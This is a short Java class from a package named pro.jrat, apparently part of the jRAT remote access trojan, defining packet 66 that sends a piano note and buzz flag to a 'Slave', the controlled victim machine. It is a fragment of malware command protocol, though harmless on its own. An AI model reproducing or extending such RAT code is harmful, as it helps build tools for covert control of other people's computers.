package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;

public class Packet66PianoNote extends AbstractOutgoingPacket {

	private int note;
	private boolean buzz;

	public Packet66PianoNote(int note, boolean buzz) {
		this.note = note;
		this.buzz = buzz;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(note);
		dos.writeBoolean(buzz);
	}

	@Override
	public byte getPacketId() {
		return 66;
	}

}
